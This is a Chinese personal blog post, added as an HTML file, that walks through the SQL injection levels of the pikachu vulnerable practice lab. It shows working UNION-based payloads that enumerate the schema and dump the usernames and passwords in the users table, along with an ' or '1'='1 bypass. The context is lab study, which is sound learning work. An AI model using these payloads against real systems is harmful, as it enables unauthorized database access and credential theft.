@@ -1,0 +1,232 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pikachu的shit用door程♂...上 | NOVA-DAWN</title><meta name="author" content="Nova-Dawn"><meta name="copyright" content="Nova-Dawn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pikachu啊，装完之后就一直吃灰了，要交作业才想起来要不要更，shit，更… 这是国内搞得一个靶场，相比dvwa来讲更友好些，东西也更多，看着还不赖嘞 哦哟还有彩蛋呢，回头找找 比噶比噶…(电光耗子音)  sql-inject要交sql注入，先更这个吧 数字型进去就是让你选数字，然后告诉你信息，url栏没有参数，那抓包改吧？ bp启动，随便抓个包，已经确定是数字了那就不试了，直接去找列，ord">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu的shit用door程♂...上">
+<meta property="og:url" content="https://nova-dawn-nd.github.io/2026/09/18/pikachu%E7%9A%84shit%E7%94%A8door%E7%A8%8B%E2%99%82-%E4%B8%8A/index.html">
+<meta property="og:site_name" content="NOVA-DAWN">
+<meta property="og:description" content="pikachu啊，装完之后就一直吃灰了，要交作业才想起来要不要更，shit，更… 这是国内搞得一个靶场，相比dvwa来讲更友好些，东西也更多，看着还不赖嘞 哦哟还有彩蛋呢，回头找找 比噶比噶…(电光耗子音)  sql-inject要交sql注入，先更这个吧 数字型进去就是让你选数字，然后告诉你信息，url栏没有参数，那抓包改吧？ bp启动，随便抓个包，已经确定是数字了那就不试了，直接去找列，ord">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://nova-dawn-nd.github.io/imgs/post.jpg">
+<meta property="article:published_time" content="2026-09-18T05:12:36.000Z">
+<meta property="article:modified_time" content="2026-09-18T08:38:17.982Z">
+<meta property="article:author" content="Nova-Dawn">
+<meta property="article:tag" content="pikachu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nova-dawn-nd.github.io/imgs/post.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pikachu的shit用door程♂...上",
+  "url": "https://nova-dawn-nd.github.io/2026/09/18/pikachu%E7%9A%84shit%E7%94%A8door%E7%A8%8B%E2%99%82-%E4%B8%8A/",
+  "image": "https://nova-dawn-nd.github.io/imgs/post.jpg",
+  "datePublished": "2026-09-18T05:12:36.000Z",
+  "dateModified": "2026-09-18T08:38:17.982Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Nova-Dawn",
+      "url": "https://Nova-Dawn-ND.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/imgs/logo.jpeg"><link rel="canonical" href="https://nova-dawn-nd.github.io/2026/09/18/pikachu%E7%9A%84shit%E7%94%A8door%E7%A8%8B%E2%99%82-%E4%B8%8A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pikachu的shit用door程♂...上',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/title-effect.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/imgs/beijing.webp);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/imgs/logo.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-info-circle"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/imgs/post.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">NOVA-DAWN</span></a><a class="nav-page-title" href="/"><span class="site-name">pikachu的shit用door程♂...上</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-info-circle"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pikachu的shit用door程♂...上</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-09-18T05:12:36.000Z" title="发表于 2026-09-18 13:12:36">2026-09-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-09-18T08:38:17.982Z" title="更新于 2026-09-18 16:38:17">2026-09-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>pikachu啊，装完之后就一直吃灰了，要交作业才想起来要不要更，shit，更…</p>
+<p>这是国内搞得一个靶场，相比dvwa来讲更友好些，东西也更多，看着还不赖嘞</p>
+<p>哦哟还有彩蛋呢，回头找找</p>
+<p>比噶比噶…(电光耗子音)</p>
+<hr>
+<h1 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql-inject"></a>sql-inject</h1><p>要交sql注入，先更这个吧</p>
+<h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>进去就是让你选数字，然后告诉你信息，url栏没有参数，那抓包改吧？</p>
+<p>bp启动，随便抓个包，已经确定是数字了那就不试了，直接去找列，<code>order by ...</code>和dvwa一样，一点点试，最后确定是2列</p>
+<p><img src="/pikachu/sql1.png" alt="sql1"></p>
+<p>联合查询库<code>union select 1,2</code>，看到回显，其实这里直接sqlmap是最快的，懒得打开kali，就这样吧</p>
+<p>和dvwa一样的步骤，这里不知道会不会有排序规则的问题</p>
+<p><code>union select database(),user() -- </code>回显了我们的身份，一个叫pikachu的库名，以及我们的email</p>
+<p>然后去拿库里的东西，<code>UNION SELECT CAST(table_name AS CHAR), 2 FROM information_schema.tables WHERE table_schema = &#39;pikachu&#39; -- </code></p>
+<p><img src="/pikachu/sql2.png" alt="sql2"></p>
+<p>去找表名</p>
+<p><code> union select group_concat(column_name),2 from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39;</code></p>
+<p><img src="/pikachu/sql3.png" alt="sql3"></p>
+<p>之后查密码即可</p>
+<p><code> union select group_concat(username),group_concat(password) from users</code></p>
+<p><img src="/pikachu/sql4.png" alt="sql4"></p>
+<p>拿到密码去解密</p>
+<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>随便输点啥，发现url显示参数，那说啥了，闭合走起；原来他题目里写get传参了，是我没看见…</p>
+<p><code>&#39; 1 or &#39;1&#39; = &#39;1</code>默认起手，发现回显了uid表</p>
+<p>那说白了，和上面一样</p>
+<p>主要这里记得注释掉后续内容，不然会出错</p>
+<p><code>union select 1,2 -- </code>正常回显，再去找database，users，巴拉巴拉的</p>
+<p>最后</p>
+<p><img src="/pikachu/sql5.png" alt="sql5"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Nova-Dawn-ND.github.io">Nova-Dawn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://nova-dawn-nd.github.io/2026/09/18/pikachu%E7%9A%84shit%E7%94%A8door%E7%A8%8B%E2%99%82-%E4%B8%8A/">https://nova-dawn-nd.github.io/2026/09/18/pikachu%E7%9A%84shit%E7%94%A8door%E7%A8%8B%E2%99%82-%E4%B8%8A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Nova-Dawn-ND.github.io" target="_blank">NOVA-DAWN</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pikachu/">pikachu</a></div><div class="post-share"><div class="social-share" data-image="/imgs/post.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/09/07/Nova-Dawn%E7%8B%AC%E5%89%B5%E7%A7%98%E4%BC%9D%E3%81%AEDVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5-%E4%B8%8B/" title="Nova-Dawn独創秘伝のDVWA靶场通关攻略--下"><img class="cover" src="/imgs/post.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Nova-Dawn独創秘伝のDVWA靶场通关攻略--下</div></div><div class="info-2"><div class="info-item-1">七、sql injectionsql注入是由于不安全的字符串拼接造成的 注入流程大致是：判断是否可注入，字符型还是数字型；猜解SQL查询语句中的字段数；确定显示的字段顺序；获取当前数据库；获取数据库中的表，字段名；下载数据 防御措施可以使用参数化查询和预编译语句(把结构和数据分开发送给数据库，数据库先编译好结构，再把用户输入的内容作为纯数据填入)；还有白名单，过滤掉特殊字符；最小权限原则(即使入侵成功，攻击者能做到事情有限)；隐藏错误信息，不把报错直接展示给用户；部署web防火墙(waf部署在前端，提前识别一些恶意请求) low随便输入个id查询，发现url栏直接有对应信息，那应该是直接拼接做了查询，试着敲1&#39; or &#39;1&#39;=&#39;1看看能不能注入，1&#x3D;1是永真，所以会回显所有查询记录  接下来就是获取数据库的信息了，用联合查询1&#39; UNION SELECT database(), user() -- 前面是数据库名，后面是用户名  注意–后面有个空格，有空格才是注释语句的意思   有了库后，就是列举库里的表，用information...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/imgs/logo.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Nova-Dawn</div><div class="author-info-description">写点啥好呢 ₍^. .^₎⟆</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Nova-Dawn-ND/Nova-Dawn-ND.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">吾日三省吾身<br> 吾没错<br> 别问吾<br> 吾不知道<br> ~(￣▽￣)~*<br> 万一我突然中了五百万呢<br> (⓿_⓿)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql-inject"><span class="toc-number">1.</span> <span class="toc-text">sql-inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">字符型</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/18/pikachu%E7%9A%84shit%E7%94%A8door%E7%A8%8B%E2%99%82-%E4%B8%8A/" title="pikachu的shit用door程♂...上">pikachu的shit用door程♂...上</a><time datetime="2026-09-18T05:12:36.000Z" title="发表于 2026-09-18 13:12:36">2026-09-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/07/Nova-Dawn%E7%8B%AC%E5%89%B5%E7%A7%98%E4%BC%9D%E3%81%AEDVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5-%E4%B8%8B/" title="Nova-Dawn独創秘伝のDVWA靶场通关攻略--下">Nova-Dawn独創秘伝のDVWA靶场通关攻略--下</a><time datetime="2026-09-07T00:18:29.000Z" title="发表于 2026-09-07 08:18:29">2026-09-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/25/BurpSuite%E6%B1%89%E5%8C%96%E7%89%88%E8%B5%84%E6%BA%90-%E4%B8%93%E4%B8%9A%E7%89%88-%E5%8F%8A%E7%A0%B4%E8%A7%A3%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/" title="BurpSuite汉化版资源(专业版)及破解配置教程">BurpSuite汉化版资源(专业版)及破解配置教程</a><time datetime="2026-08-25T12:57:54.000Z" title="发表于 2026-08-25 20:57:54">2026-08-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/Nova-Dawn%E7%8B%AC%E5%89%B5%E7%A7%98%E4%BC%9D%E3%81%AEDVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%E2%80%94%E2%80%94%E9%9C%9C%E9%B8%A1/" title="Nova-Dawn独創秘伝のDVWA靶场通关攻略——霜鸡!!!">Nova-Dawn独創秘伝のDVWA靶场通关攻略——霜鸡!!!</a><time datetime="2026-08-24T08:45:06.000Z" title="发表于 2026-08-24 16:45:06">2026-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/15/%E8%8F%B2%E9%9B%BE%E5%8B%87%E9%97%AF%E8%8F%9C%E7%8B%97%E6%9D%AFweb%E7%AD%BE%E5%88%B0%E9%A2%98/" title="菲雾勇闯菜狗杯web签到题">菲雾勇闯菜狗杯web签到题</a><time datetime="2026-08-15T08:29:42.000Z" title="发表于 2026-08-15 16:29:42">2026-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Nova-Dawn</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.6.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.6.1"></script><script src="/js/main.js?v=5.6.1"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
